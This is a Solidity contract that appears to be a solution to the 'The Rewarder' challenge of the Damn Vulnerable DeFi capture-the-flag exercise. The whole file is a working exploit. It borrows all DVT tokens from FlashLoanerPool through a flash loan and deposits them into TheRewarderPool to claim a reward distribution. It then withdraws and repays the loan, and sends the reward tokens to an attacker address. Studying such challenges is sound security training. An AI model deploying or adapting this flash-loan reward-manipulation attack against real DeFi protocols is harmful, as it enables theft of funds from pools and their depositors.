// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract HackTheRewarder {

    FlashLoanerPool public flPool;
    DamnValuableToken public dvtToken;
    TheRewarderPool public trPool;
    RewardToken public rewardToken;
    address public attacker;

    constructor (
        address _flPoolAddress,
        address _dvtTokenAddress,
        address _trPoolAddress,
        address _rewardTokenAddress,
        address _attacker) {
        flPool = FlashLoanerPool(_flPoolAddress);
        dvtToken = DamnValuableToken(_dvtTokenAddress);
        trPool = TheRewarderPool(_trPoolAddress);
        rewardToken = RewardToken(_rewardTokenAddress);
        attacker = _attacker;
    }


    function hack() public {

        // Get the balance of DVT tokens held by the FlashLoanerPool
        uint256 amount = dvtToken.balanceOf(address(flPool));

        // Take a flashloan of all DVT tokens
        flPool.flashLoan(amount);

    }

    function receiveFlashLoan(uint256 amount) public {

        // Approve DVT token for TheRewarderPool
        dvtToken.approve(address(trPool), amount);
        
        // Deposit all DVT into TheRewarderPool. This will internally call the distributeRewards method
        trPool.deposit(amount);

        // Withdraw all DVT
        trPool.withdraw(amount);

        // Payback the flashloan
        dvtToken.transfer(address(flPool), amount);

        // Transfer the reward token to msg.sender
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));

    }

}